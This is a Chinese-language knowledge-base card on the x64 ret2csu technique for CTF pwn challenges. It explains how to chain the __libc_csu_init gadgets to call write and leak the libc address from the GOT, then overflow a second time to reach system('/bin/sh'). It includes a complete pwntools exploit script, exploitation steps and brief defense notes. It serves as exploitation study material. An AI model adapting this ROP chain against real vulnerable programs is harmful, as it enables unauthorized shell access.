---
id: binary-pwn-rop-ret2csu-write-got-leak-ret2libc
title: 缺 pop rdx 时的 ret2csu：借 __libc_csu_init 两段 gadget 调 write(1, GOT, n) 泄 libc 再二次溢出拿 shell
type: scenario
domain: binary
path: binary/pwn/rop
technique: ret2csu-three-arg-write-got-leak-ret2libc
aliases:
- ret2csu
- __libc_csu_init
- csu gadget
- pop rdx 缺失
- ret2csu 泄露 libc
- csu 调三参数函数
tags:
- pwn
- rop
- ret2csu
- ret2libc
- got-leak
- gadget
- stack-overflow
- x64
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V596
  verified_at: '2026-11-12T17:02:01+08:00'
  notes: 已对照原文与图01-06核对：img05/01 为 __libc_csu_init pop6(0x40132A) 与中段 mov rdx,r14/mov rsi,r13/mov edi,r12d/call [r15+rbx*8] 现场，gdb 显示 rdi=1、rsi=0x404018(write@got.plt)、rdx=0x30，与 payload1 write(1,write@got,0x30) 一致；img02/03/04 为 64 位栈迁移 demo，非本卡范围。核对原文脚本：csu_end=0x40132A、csu_front=0x401310、pop_rdi=0x401333、last=0x4011FD 与卡片一致；原文形参命名混淆（def 顺序 rbx,rbp,r12,r15,r14,r13 而实际压栈 rbx,rbp,r12,r13,r14,r15），卡片按压栈顺序重写模板正确（r12=1→edi、r13=write_got→rsi、r14=0x30→rdx、r15=write_got→call GOT）。发现并修正一处 PoC 偏差：原文 payload2 用 ret_addr=0x40101a 的裸 ret 做栈对齐，卡片误写成 ret_main(0x4011FD)；已在 KB 卡与 staging 草稿中改为 ret_align=0x40101a（payload1 的返回 main 仍为 0x4011FD，正确）。dedup：与 binary-pwn-stack-ret2libc（通用 ret2libc）、binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch（csu 写 /bin/sh 到 bss）、binary-pwn-rop-alarm-got-syscall-ret2csu-orw（csu 调 syscall）均非同链，dedup 判定为 new，成立；dup-scan 无本卡 pair。跳过项：stack pivoting demo（图02-06）与既有卡 binary-pwn-stack-pivot-leave-ret-bss 同链（该卡含 64 位 saved RBP=fake-8 变体说明），跳过成立；SROP/ret2dlresolve 原文仅一段外链概述，跳过成立。affected
    无版本（CTF 题/未标版本），未 set-versions。未验证点：PoC 未在本机复跑，地址/偏移需按目标重算；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

64 位程序只有 `pop rdi`/`pop rsi` 而没有 `pop rdx; ret` 时，可用 `__libc_csu_init` 尾部的 `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` 与中段的 `mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]` 两段 gadget 组合，把 `rdi/rsi/rdx` 设成任意值并调用 GOT 中的函数；经典用法是 `write(1, write@got, 0x30)` 泄露 libc 基址，再二次溢出 `system("/bin/sh")`。

## 原理

- 参数寄存器缺口：`write/read/execve` 等三参数函数需要控制 `rdx`，但正常编译产物通常只带 `pop rdi; ret`、`pop rsi; ret`，很少自带 `pop rdx; ret`；没有 `rdx` 就无法指定输出/读取长度，泄露链难以成立。
- csu 两段 gadget：`__libc_csu_init` 由编译器自动生成，结尾固定为 `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`（记作 pop6），中段为 `mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]` 后接 `add rbx,1; cmp rbp,rbx; jnz` 循环与 `add rsp,8; pop rbx..r15; ret` 收尾。
- 组合方式：先跳到 pop6 从栈上设置六个寄存器，再跳到中段；令 `rbx=0`、`rbp=1`（`cmp` 后相等，不再循环）、`r12=edi`、`r13=rsi`、`r14=rdx`、`r15=要调用的函数 GOT 项`，`call [r15+rbx*8]` 即调用该函数。因为是通过 GOT 间接调用，`r15` 应填 GOT 地址而非 PLT 地址。
- 收尾填充：中段执行完目标函数后还会 `add rsp,8` 并再 pop 六个寄存器，合计 0x38 字节，需要在 payload 中用 `b'A'*0x38` 吃掉，最后再放下一跳地址（如返回 main 或下一段 csu）。
- 泄露与二次利用：第一次溢出用 csu 调 `write(1, write@got, 0x30)` 输出 GOT 中的真实地址，减去 libc 中 `write` 偏移得基址；再返回 `main`/漏洞函数进行第二次溢出，用 `pop rdi; ret` + `system("/bin/sh")`（或 one_gadget）完成利用。
- 寄存器映射随 libc/编译器版本可能变化：不同构建中 csu 中段可能表现为 `mov rdx,r14; mov rsi,r13; mov edi,r12d` 或 `mov rdx,r13; mov rsi,r14; mov edi,r15d` 等，必须以目标二进制的实际反汇编为准。

## 触发条件

- 64 位 ELF 存在栈溢出，可覆盖返回地址；无 canary 或已绕过。
- 二进制非 PIE 或已泄露基址，`__libc_csu_init` 的 pop6/中段地址可确定。
- 程序存在可调用的输出函数（如 write@got/puts@got）用于泄露 libc 地址。
- 缺少可用的 `pop rdx; ret`（否则直接用 pop 链更简单）。
- 有二次输入机会（返回 main/漏洞函数）以提交第二阶段 payload。

## 利用步骤

1. `checksec` 确认保护，IDA 定位 `__libc_csu_init` 的 pop6 段与 `mov rdx,r14...call` 中段地址，并确认调用目标用 GOT。
2. 计算溢出偏移到返回地址；构造 csu 调用模板（见 PoC），先用 `write(1, write@got, 8~0x30)` 泄露地址。
3. 接收泄露值，`u64(...)` 后减去已知 libc 的 `write` 偏移得到基址；换算 `system` 与 `/bin/sh`（或 one_gadget）。
4. 第二次溢出：`pop rdi; ret` + `/bin/sh` + `system`（必要时加一个 `ret` 做 16 字节栈对齐）。
5. 交互验证 shell；若泄露长度不足，调整 `rdx` 或改用 `puts@got`。
6. 若程序对输入长度有 `strlen` 检查，可在填充中提前放 `\x00` 截断（如 16 个 `'a'` 后接 8 个 `\x00` 再放 ROP），使检查通过而 ROP 仍在返回地址处生效。

## PoC

```python
from pwn import *
context(log_level='debug')
io = process('./chal'); elf = ELF('./chal')
libc = ELF('./libc.so.6')

csu_pop6 = 0x40132A      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x401310      # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
pop_rdi  = 0x401333
write_got = elf.got['write']
ret_main  = 0x4011FD
ret_align = 0x40101a      # 裸 ret，二次链中用于 16 字节栈对齐（原文 ret_addr）

def csu(rbx, rbp, r12, r13, r14, r15, last):
    p  = p64(csu_pop6)
    p += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    p += p64(csu_call)
    p += b'A' * 0x38          # 吃掉 add rsp,8 + pop6
    p += p64(last)
    return p

# write(1, write_got, 0x30) 后返回 main
payload1 = b'a'*0x10 + b'\x00'*8 + csu(0, 1, 1, write_got, 0x30, write_got, ret_main)
io.sendlineafter(b'backdoor!', payload1)

write_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = write_addr - libc.sym['write']
system = libc_base + libc.symbols['system']
binsh  = libc_base + next(libc.search(b'/bin/sh\x00'))

payload2 = b'\x00'.ljust(0x18, b'a') + p64(ret_align) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendlineafter(b'backdoor!', payload2)
io.interactive()
```

注：地址与偏移取自原文例题，实际目标必须按自身反汇编与 libc 版本重算；`csu()` 的实参顺序以本卡模板为准（原文脚本形参命名有混淆，以 payload 压栈顺序 `rbx,rbp,r12,r13,r14,r15` 和实际寄存器映射为准）。

## 变体与关联

- 变体：`puts@got` 泄露（只需 rdi）；`read(0, bss, n)` 写第二段数据；通过 csu 直接调 `execve` 做 ret2syscall；目标为 MIPS/ARM 时 csu 形态不同。
- 关联：与[[binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch]]（用 csu 把 /bin/sh 写入 bss）互补，本卡用 csu 完成三参数泄露；与[[binary-pwn-stack-ret2libc]]（通用 ret2libc）相比，本卡解决没有 `pop rdx` 时的参数控制；[[binary-pwn-rop-alarm-got-syscall-ret2csu-orw]] 是 csu 调系统调用的另一变体。
- 边界：若二进制存在 `pop rdx; ret` 或 `pop rdx; pop rbx; ret`，直接 pop 链更短更稳；csu 依赖 `__libc_csu_init` 不被编译优化掉（新编译器/静态链接可能没有）。

## 检测与防御

- 防御：编译时开启 PIE/Full RELRO 降低 GOT 泄露与覆盖价值；使用 `-fno-stack-protector` 之外的默认栈保护与 FORTIFY；移除未使用的 csu 初始化残留不现实，核心仍是消除栈溢出并用 ASLR/PIE 阻断地址计算。
- 检测：二进制加固检查（checksec）作为发布门禁；对异常长输入/ROP 特征（大量 8 字节地址、GOT 地址出现在栈上）做运行时监控；CTF 之外无直接检测手段。
